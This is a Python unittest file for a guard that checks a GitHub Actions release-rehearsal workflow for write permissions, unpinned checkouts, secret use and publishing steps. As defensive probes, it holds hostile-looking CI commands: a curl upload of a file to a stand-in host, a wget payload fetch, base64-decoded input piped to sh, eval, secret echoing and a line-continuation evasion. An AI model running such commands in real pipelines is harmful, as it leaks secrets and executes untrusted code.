"""Tests for scripts/release_rehearsal/workflow_guard.py (issue #9)."""

import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT))

from scripts.release_rehearsal import workflow_guard as wg

GOOD_WORKFLOW = """\
name: Release Rehearsal
on:
  pull_request:
    branches: [ "master" ]
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  release-rehearsal:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false
      - run: make release-check
"""


class GoodWorkflowTests(unittest.TestCase):
    def test_no_violations(self):
        self.assertEqual(wg.validate_workflow_text(GOOD_WORKFLOW), [])

    def test_immutable_sha_checkout_ref_accepted(self):
        text = GOOD_WORKFLOW.replace(
            "actions/checkout@v7", "actions/checkout@" + "a" * 40
        )
        self.assertEqual(wg.validate_workflow_text(text), [])


class TriggerViolationTests(unittest.TestCase):
    def test_push_trigger_rejected(self):
        text = GOOD_WORKFLOW.replace(
            'on:\n  pull_request:\n    branches: [ "master" ]\n  workflow_dispatch: {}',
            'on:\n  push:\n    branches: [ "master" ]\n  workflow_dispatch: {}',
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("disallowed trigger" in v for v in violations))


class PermissionViolationTests(unittest.TestCase):
    def test_missing_top_level_permissions(self):
        text = GOOD_WORKFLOW.replace("permissions:\n  contents: read\n\n", "")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("permissions" in v for v in violations))

    def test_write_permission_rejected(self):
        text = GOOD_WORKFLOW.replace("contents: read", "contents: write")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write" in v for v in violations))

    def test_contents_write_anywhere_rejected(self):
        text = GOOD_WORKFLOW + "\n# contents: write (job override attempt)\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))


class CheckoutViolationTests(unittest.TestCase):
    def test_unpinned_checkout_ref_rejected(self):
        text = GOOD_WORKFLOW.replace("actions/checkout@v7", "actions/checkout@main")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("not an accepted version" in v for v in violations))

    def test_missing_persist_credentials_false_rejected(self):
        text = GOOD_WORKFLOW.replace("          persist-credentials: false\n", "")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("persist-credentials" in v for v in violations))


class ForbiddenSubstringTests(unittest.TestCase):
    def test_upload_artifact_rejected(self):
        text = GOOD_WORKFLOW + "\n      - uses: actions/upload-artifact@v4\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("upload-artifact" in v for v in violations))

    def test_gh_release_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: gh release create v1.0.0\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("gh release" in v for v in violations))

    def test_secrets_usage_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: echo ${{ secrets.TOKEN }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("secrets." in v for v in violations))

    def test_git_tag_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: git tag v1.0.0\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git tag" in v for v in violations))

    def test_environment_rejected(self):
        text = GOOD_WORKFLOW + "\n    environment: production\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("environment:" in v for v in violations))


class RepositoryStateTests(unittest.TestCase):
    def test_real_release_rehearsal_workflow_is_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.validate_workflow_text(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])

    def test_no_release_publish_workflow_exists(self):
        publish_path = ROOT / ".github" / "workflows" / "release-publish.yml"
        self.assertFalse(publish_path.exists())


# --- issue #9 verifier remediation: adversarial verifier-probe tests -------
# Every probe below encodes one specific evasion/escalation class the
# independent verifier's own findings called out by name. Each is a
# targeted mutation of GOOD_WORKFLOW (or a minimal standalone snippet),
# asserted to be REJECTED (or, for the final class, a realistic dynamic-
# summary workflow asserted to remain CLEAN).

class JobAndNestedPermissionEscalationTests(unittest.TestCase):
    def test_job_level_contents_write_rejected(self):
        text = GOOD_WORKFLOW.replace(
            "  release-rehearsal:\n    runs-on: ubuntu-latest",
            "  release-rehearsal:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write",
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_nested_step_level_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      permissions:\n        contents: write\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_deeply_indented_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "                        contents:      write\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_quoted_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      contents: 'write'\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_double_quoted_contents_write_rejected(self):
        text = GOOD_WORKFLOW + '      contents: "write"\n'
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_no_space_after_colon_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      contents:write\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_tab_whitespace_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      contents:\twrite\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))


class ShorthandPermissionTests(unittest.TestCase):
    def test_scalar_write_all_shorthand_rejected(self):
        text = GOOD_WORKFLOW.replace("permissions:\n  contents: read", "permissions: write-all")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write-all" in v or "does not declare" in v for v in violations))

    def test_job_level_write_all_shorthand_rejected(self):
        text = GOOD_WORKFLOW.replace(
            "  release-rehearsal:\n    runs-on: ubuntu-latest",
            "  release-rehearsal:\n    runs-on: ubuntu-latest\n    permissions: write-all",
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write-all" in v for v in violations))

    def test_read_all_shorthand_is_conservatively_rejected(self):
        """This checker requires the explicit, unambiguous
        'contents: read' mapping block form -- a scalar 'read-all'
        shorthand (even though semantically safe) is conservatively
        rejected (as an unrecognized/missing top-level permissions
        block) rather than specially recognized, per this module's
        fail-closed-on-ambiguity design."""
        text = GOOD_WORKFLOW.replace("permissions:\n  contents: read", "permissions: read-all")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("permissions" in v for v in violations))


class TokenAndSecretsInterpolationTests(unittest.TestCase):
    def test_github_token_interpolation_rejected(self):
        text = GOOD_WORKFLOW + "      - run: echo ${{ github.token }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("github.token" in v for v in violations))

    def test_github_token_case_variant_rejected(self):
        text = GOOD_WORKFLOW + "      - run: echo ${{ GitHub.Token }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("github.token" in v.lower() for v in violations))

    def test_explicit_github_token_env_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: gh api /rate_limit\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("secrets." in v or "gh_token" in v.lower() for v in violations))

    def test_secrets_case_variant_rejected(self):
        text = GOOD_WORKFLOW + "      - run: echo ${{ Secrets.TOKEN }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("secrets" in v.lower() for v in violations))


class CommandIndirectionAndEvasionTests(unittest.TestCase):
    """Command-continuation/variable/subshell/eval/base64/'sh -c' evasion
    probes -- issue #9 verifier remediation."""

    def test_curl_rejected(self):
        text = GOOD_WORKFLOW + "      - run: curl https://example.invalid/upload -d @out.bin\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("curl" in v for v in violations))

    def test_wget_rejected(self):
        text = GOOD_WORKFLOW + "      - run: wget https://example.invalid/payload\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("wget" in v for v in violations))

    def test_curl_split_across_continuation_line_rejected(self):
        """A dangerous command split across a shell line-continuation
        (trailing backslash) must not evade detection just because the
        literal substring "curl" is not on the same physical line as the
        rest of the command."""
        text = GOOD_WORKFLOW + "      - run: |\n          cu\\\nrl https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        # "cu\\\nrl" normalizes to "curl" once the continuation is collapsed.
        self.assertTrue(any("curl" in v for v in violations))

    def test_eval_rejected(self):
        text = GOOD_WORKFLOW + "      - run: eval \"$SOME_VAR\"\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("eval" in v for v in violations))

    def test_base64_decode_pipe_to_shell_rejected(self):
        text = GOOD_WORKFLOW + "      - run: echo $PAYLOAD | base64 -d | sh\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("base64" in v for v in violations))

    def test_sh_dash_c_rejected(self):
        text = GOOD_WORKFLOW + "      - run: sh -c 'echo hi'\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("sh -c" in v for v in violations))

    def test_bash_dash_c_rejected(self):
        text = GOOD_WORKFLOW + "      - run: bash -c 'echo hi'\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("bash -c" in v for v in violations))

    def test_mutating_gh_api_post_rejected(self):
        text = GOOD_WORKFLOW + "      - run: gh api -X POST /repos/x/y/releases\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("gh api" in v for v in violations))

    def test_mutating_gh_api_method_flag_variant_rejected(self):
        text = GOOD_WORKFLOW + "      - run: gh api --method POST /repos/x/y/releases\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("gh api" in v for v in violations))

    def test_read_only_gh_api_get_is_not_rejected_by_the_mutating_rule(self):
        """A plain read-only 'gh api' call (no explicit mutating method)
        must not be flagged by the *mutating-gh-api* rule specifically --
        this module does not blanket-forbid all 'gh api' usage."""
        text = "gh api /rate_limit"
        for pattern, label in wg._COMPILED_FORBIDDEN_PATTERNS:
            if "mutating" in label:
                self.assertIsNone(pattern.search(text))


class NetworkAndUploadActionTests(unittest.TestCase):
    def test_disguised_case_variant_upload_artifact_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: Actions/Upload-Artifact@v4\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("upload" in v.lower() for v in violations))

    def test_unlisted_upload_action_rejected_by_generalized_heuristic(self):
        """An upload action this module has never explicitly enumerated
        (a fork, or a differently-named third-party action) must still
        be caught by the generalized 'uses:' name heuristic."""
        text = GOOD_WORKFLOW + "      - uses: some-fork/totally-unheard-of-upload-thing@v1\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("upload" in v.lower() for v in violations))

    def test_publish_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: pypa/gh-action-pypi-publish@v1\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("publish" in v.lower() for v in violations))

    def test_deploy_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: peaceiris/actions-gh-deploy@v3\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("deploy" in v.lower() for v in violations))

    def test_release_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: ncipollo/release-action@v1\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("release" in v.lower() for v in violations))


class RefMutationTests(unittest.TestCase):
    def test_git_push_without_tags_flag_rejected(self):
        text = GOOD_WORKFLOW + "      - run: git push origin HEAD:refs/heads/gh-pages\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git push" in v for v in violations))

    def test_git_push_tags_rejected(self):
        text = GOOD_WORKFLOW + "      - run: git push --tags\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git push" in v for v in violations))

    def test_git_tag_rejected_case_insensitive(self):
        text = GOOD_WORKFLOW + "      - run: Git Tag v1.0.0\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git tag" in v.lower() for v in violations))


class ValidDynamicSummaryWorkflowTests(unittest.TestCase):
    """A realistic, valid workflow using stdlib-JSON-driven dynamic
    summary generation (issue #9 item 7) must remain completely clean --
    hardening the guard must never produce a false positive against the
    actual, legitimate shape this repository's own workflow uses."""

    DYNAMIC_SUMMARY_WORKFLOW = """\
name: Release Rehearsal
on:
  pull_request:
    branches: [ "master" ]
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  release-rehearsal:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false
      - name: Run release eligibility check
        run: make release-check
      - name: Render dynamic job summary from canonical JSON
        if: always()
        run: python3 -m scripts.release_rehearsal.cli check >> "$GITHUB_STEP_SUMMARY"
"""

    def test_valid_dynamic_summary_workflow_has_no_violations(self):
        violations = wg.validate_workflow_text(self.DYNAMIC_SUMMARY_WORKFLOW)
        self.assertEqual(violations, [])


if __name__ == "__main__":
    unittest.main()
